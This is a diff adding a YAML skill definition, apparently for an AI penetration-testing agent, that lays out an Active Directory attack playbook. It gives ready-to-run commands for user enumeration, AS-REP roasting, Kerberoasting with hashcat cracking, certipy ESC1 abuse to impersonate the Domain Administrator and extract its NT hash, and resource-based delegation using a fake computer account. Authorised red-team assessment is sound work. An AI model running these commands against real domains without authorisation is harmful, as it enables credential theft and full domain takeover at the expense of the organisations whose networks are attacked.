@@ -1,0 +1,68 @@
+schema_version: 1
+version: 3.0.0
+name: active-directory
+description: Senior Active Directory and Kerberos domain assessment — Kerberoasting, AS-REP roasting, AD CS (ESC1-ESC17), delegation abuse, BloodHound collection, and DACL analysis.
+triggers:
+  - active directory
+  - ad
+  - kerberos
+  - domain controller
+  - kerberoast
+  - kerberoasting
+  - asrep
+  - as-rep
+  - bloodhound
+  - certipy
+  - adcs
+  - ad cs
+  - dcsync
+  - golden ticket
+tools:
+  - netexec
+  - kerbrute
+knowledge: |
+  Assess Active Directory and Kerberos environments like a senior red-team operator, focusing on misconfiguration chains, identity abuse, and certificate templates.
+
+  1. ANONYMOUS & PRE-AUTHENTICATION ENUMERATION:
+     - Enumerate naming context and DC metadata via LDAP rootDSE:
+       `nmap -Pn -p 389 --script ldap-rootdse <dc_ip>`
+     - Kerberos Pre-Authentication User Enumeration (Zero Login Failures):
+       `kerbrute userenum -d <domain> --dc <dc_ip> $USERNAMES`
+     - AS-REP Roasting (No Domain Credentials Needed):
+       Extract crackable `$krb5asrep$23$` ticket hashes for accounts with `DONT_REQ_PREAUTH` enabled:
+       `GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip <dc_ip> -format hashcat`
+       Crack offline: `hashcat -m 18200 asrep.txt $PASSWORDS_TOP`
+
+  2. AUTHENTICATED ENUMERATION & BLOODHOUND GRAPH MAPPING:
+     - Verify domain user credentials and password policy:
+       `netexec ldap <dc_ip> -u <user> -p <pass> --pass-pol`
+     - Collect BloodHound domain graph telemetry:
+       `bloodhound-python -d <domain> -u <user> -p <pass> -c All -ns <dc_ip> --zip`
+     - Prioritize analysis on: Shortest Paths to Domain Admins, Owned Principals, and High-Value Groups.
+
+  3. KERBEROASTING (SPN Service Accounts):
+     - Request Kerberos TGS tickets for accounts possessing Service Principal Names:
+       `netexec ldap <dc_ip> -u <user> -p <pass> --kerberoasting /home/pentester/work/kerb.txt`
+       or `GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<pass> -outputfile /home/pentester/work/kerb.txt`
+     - Crack captured service ticket hashes offline: `hashcat -m 13100 kerb.txt $PASSWORDS_TOP`.
+
+  4. ACTIVE DIRECTORY CERTIFICATE SERVICES (AD CS — ESC1 to ESC17):
+     AD CS misconfigurations represent the highest-yield modern domain privilege escalation vectors:
+     - Enumerate vulnerable certificate templates:
+       `certipy find -u <user>@<domain> -p <pass> -dc-ip <dc_ip> -vulnerable -stdout`
+     - ESC1 Exploitation (Client Auth EKU + Enrollee Supplies SAN):
+       Request a certificate impersonating the Domain Administrator:
+       `certipy req -u <user>@<domain> -p <pass> -ca <ca_name> -template <vulnerable_template> -upn administrator@<domain>`
+       Authenticate using the obtained PFX certificate to extract Domain Admin NT hash:
+       `certipy auth -pfx administrator.pfx -dc-ip <dc_ip>`
+
+  5. RESOURCE-BASED CONSTRAINED DELEGATION (RBCD):
+     When write access exists over a target computer object and `MachineAccountQuota > 0`:
+     • Create a fake computer account: `addcomputer.py -computer-name FAKE$ -computer-pass P@ss <domain>/<user>:<pass>`
+     • Set `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target to point to FAKE$.
+     • Execute S4U2Self and S4U2Proxy to obtain an administrator service ticket for the target host.
+references:
+  - persona:active-directory-v3
+provenance:
+  origin: builtin
+  source: persona/v0.1/skills/active-directory.yaml
